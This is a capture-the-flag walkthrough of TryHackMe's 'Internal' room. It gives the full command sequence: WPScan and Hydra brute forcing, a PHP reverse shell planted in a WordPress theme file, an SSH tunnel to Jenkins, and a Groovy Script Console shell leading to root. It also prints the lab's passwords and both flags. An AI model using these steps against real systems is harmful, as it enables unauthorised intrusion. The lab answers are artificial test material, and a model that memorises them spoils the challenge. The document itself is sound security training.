# 🔐 Internal — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)
![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Penetration%20Testing-blueviolet?style=for-the-badge)

---

## 📌 Room Info

| Field | Details |
|-------|---------|
| 🏠 Room | [Internal](https://tryhackme.com/room/internal) |
| 🎯 Difficulty | Hard |
| 🏷️ Tags | WordPress, WPScan, Reverse Shell, Port Forwarding, Jenkins, Privilege Escalation |
| 👤 Author | Aryan Remje |

---

## 🎯 Objectives

- Enumerate the target and identify running services
- Gain initial foothold via WordPress vulnerability
- Find credentials and escalate to a user account
- Forward internal ports and exploit Jenkins
- Escalate to root and capture both flags

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `Nmap` | Port scanning and service enumeration |
| `WPScan` | WordPress vulnerability scanner and brute force |
| `revshells.com` | Generating reverse shell payloads |
| `Netcat (nc)` | Listening for reverse shell connections |
| `Netstat` | Internal port enumeration |
| `Hydra` | Brute forcing Jenkins login |
| `SSH` | Remote login and port forwarding |

---

## 🔍 Enumeration

### Nmap Scan

We start with a full service and script scan against the target:

```bash
nmap -sV -sC -oN nmap-scan.txt internal.thm
```

The scan returns two open ports — **port 22 (SSH)** and **port 80 (HTTP)**. SSH is running OpenSSH and port 80 is serving an Apache web server. Since SSH requires credentials we don't have yet, we focus on the web service first.

---

### Web Enumeration

Visiting `http://internal.thm` in the browser shows a default Apache page — nothing interesting on the surface. We run a directory scan to find hidden paths:

```bash
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
```

Gobuster discovers a `/blog` directory. Visiting `http://internal.thm/blog` reveals a **WordPress** site. This is a significant finding because WordPress has well-known attack vectors especially if the admin panel is accessible.

---

## 🚪 Initial Access

### Step 1 — WordPress Username Enumeration

With WordPress confirmed, we use WPScan to enumerate valid usernames:

```bash
wpscan --url http://internal.thm/blog --enumerate u
```

WPScan successfully identifies the username **admin** — a common default WordPress username that was left unchanged. This gives us a valid target for brute forcing.

---

### Step 2 — Brute Forcing the WordPress Password

Now that we have a valid username, we use WPScan with the rockyou wordlist to brute force the password:

```bash
sudo wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
```

After running through the wordlist, WPScan cracks the password successfully:

```
Username : admin
Password : my2boys
```

The admin was using a weak password that existed in the rockyou wordlist — a classic mistake.

---

### Step 3 — Logging into WordPress Admin Panel

We navigate to `http://internal.thm/blog/wp-admin` and log in with the credentials we found. We now have full admin access to the WordPress dashboard. As a WordPress admin we have the ability to **edit theme files directly from the browser** — this is the vulnerability we will exploit next.

---

### Step 4 — Reverse Shell via Theme Editor

WordPress admin has write access to PHP theme files. We navigate to:

```
Appearance → Theme Editor → Assets → 404 Template (404.php)
```

We generate a PHP reverse shell payload from [revshells.com](https://www.revshells.com/) — entering our attacker machine's IP and a chosen port (4444). The site generates a complete PHP reverse shell script. We paste this entire payload into the `404.php` file, replacing all existing content, and click **Update File**.

The file is now saved on the server with our malicious code inside it.

---

### Step 5 — Catching the Reverse Shell

Before triggering the shell, we start a Netcat listener on our machine to catch the incoming connection:

```bash
nc -lvnp 4444
```

Now we trigger the shell by making a request to the modified `404.php` file:

```bash
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

As soon as this request hits the server, PHP executes our payload and the server connects back to our listener. We now have an active shell session running as **www-data** — the web server user.

---

## 🔎 Post Exploitation — Enumeration as www-data

### Exploring the Web Root

```bash
cd /var/www/html
ls -la
```

The web root contains `index.html` and a `wordpress` directory. Inside `wordpress` we find the configuration file `wp-config.php` which is always worth reading — it stores database credentials and other sensitive configuration.

```bash
cat /var/www/html/wordpress/wp-config.php
```

The file reveals MySQL database credentials and the connection is configured to `localhost` — meaning the database is running **internally on the same machine**. This suggests there may be other services running internally that were not visible in our initial Nmap scan.

---

### Internal Port Discovery

To see what is actually running internally on the machine we run:

```bash
netstat -tulnvp
```

This reveals two interesting internal services:
- **Port 3306** — MySQL is running locally (which is why it didn't show on our external Nmap scan — it is bound to localhost only)
- **Port 8080** — An unknown service is running internally, which looks suspicious and worth investigating

> 💡 **Key Insight:** External Nmap scans only see ports exposed to the network. Services bound to `127.0.0.1` or internal Docker IPs are invisible from outside — you only discover them after getting a foothold and running `netstat` from inside.

---

## 🔭 Port 8080 Enumeration

We curl port 8080 to see what is running there:

```bash
curl http://127.0.0.1:8080
```

The response comes back as HTML — confirming that a web application is hosted on this internal port. We can't open it in our browser directly since it is only accessible from inside the machine. We will need to tunnel it to our machine later.

---

## 🏁 First Flag — User Flag

While exploring the filesystem as www-data, we check the `/opt` directory — a common place for non-standard files and sometimes credentials:

```bash
ls -la /opt
cat /opt/wp-save.txt
```

Inside we find plaintext credentials:

```
Username : aubreanna
Password : bubb13guM!@#123
```

We use these to SSH directly into the machine as a real user:

```bash
ssh aubreanna@internal.thm
```

The login succeeds and we land in aubreanna's home directory. We find two files — `user.txt` containing the first flag, and `jenkins.txt` which reveals that **Jenkins is running on 172.17.0.2:8080** — a Docker container running internally.

```
user.txt : THM{int3rna1_fl4g_1}
```

---

## 📈 Privilege Escalation

### Confirming Jenkins

We confirm the Jenkins service is alive:

```bash
curl http://172.17.0.2:8080
```

The response confirms a Jenkins login page is running on that address. Jenkins is a powerful automation server — if we can get admin access to it, we can execute arbitrary code on the server through its Script Console.

---

### SSH Port Forwarding

Since Jenkins is on a Docker internal IP, we can't reach it directly from our attacker machine. We use SSH port forwarding to tunnel it to our local port 8080:

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

This command tells SSH to listen on our local port 8080 and forward all traffic through the SSH tunnel to `172.17.0.2:8080` on the internal network. We can now access the Jenkins login page by visiting `http://localhost:8080` in our browser.

To verify the tunnel is active:

```bash
sudo netstat -tulnvp | grep 8080
```

Port 8080 shows as listening on our machine — the tunnel is working.

---

### Brute Forcing Jenkins Login

Jenkins also uses a web login form. We use Hydra to brute force it:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form \
"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

We break down this command:
- `-l admin` — we try the username admin since it is common for Jenkins
- `-P rockyou.txt` — use the rockyou wordlist
- `http-post-form` — tells Hydra to send POST requests to the login form
- The string at the end defines the form fields and the failure message Jenkins returns on wrong credentials

Hydra finds the credentials:

```
Username : admin
Password : spongebob
```

---

### RCE via Jenkins Script Console

After logging into Jenkins we navigate to:

```
Manage Jenkins → Script Console
```

The Script Console allows running **Groovy scripts** directly on the server — this is essentially remote code execution built into Jenkins. We generate a Groovy reverse shell from [revshells.com](https://www.revshells.com/), start a new Netcat listener on our machine, paste the payload into the Script Console and click Run.

```bash
nc -lvnp 5555
```

We immediately get a shell back — this time inside the Jenkins Docker container. We explore the container and check the `/opt` directory:

```bash
ls -la /opt
cat /opt/note.txt
```

Inside we find the root credentials for the main machine:

```
Username : root
Password : tr0ub13guM!@#123
```

---

### Logging in as Root

We SSH into the main machine as root using the credentials we just found:

```bash
ssh root@internal.thm
```

We land directly in the root home directory. The final flag is waiting for us:

```bash
cat /root/root.txt
```

```
root.txt : THM{d0ck3r_1nt3rna1_fl4g}
```

The machine is fully compromised.

---

## 🏆 Flags Summary

| Flag | Value |
|------|-------|
| 🚩 User Flag | `THM{int3rna1_fl4g_1}` |
| 👑 Root Flag | `THM{d0ck3r_1nt3rna1_fl4g}` |

---

## 💡 Key Learnings

- **WordPress Theme Editor** is a critical RCE vector when admin credentials are obtained — file write access = code execution
- **Internal ports** are invisible to external Nmap scans — always run `netstat` after getting a foothold to discover locally bound services
- **SSH port forwarding** (`-L` flag) is a simple and powerful way to access services running on internal Docker networks
- **Jenkins Script Console** is essentially a built-in code execution feature — if an attacker gets admin access it is game over
- **Credential reuse** across services (WordPress → SSH → Jenkins) is extremely common and should always be tested
- **The `/opt` directory** is often overlooked but frequently contains leftover credentials and configuration files

---

## 📚 References

- [WPScan Documentation](https://wpscan.com/documentation)
- [Reverse Shell Generator — revshells.com](https://www.revshells.com/)
- [Port Forwarding with Chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
- [Jenkins Groovy Script Console RCE](https://www.hackingarticles.in/jenkins-penetration-testing/)
- [SSH Port Forwarding Explained](https://linuxize.com/post/how-to-setup-ssh-tunneling/)

---

*Writeup by [Aryan Remje](https://github.com/Aryan-Remje) · [TryHackMe Profile](https://tryhackme.com/p/AryanRemje)*
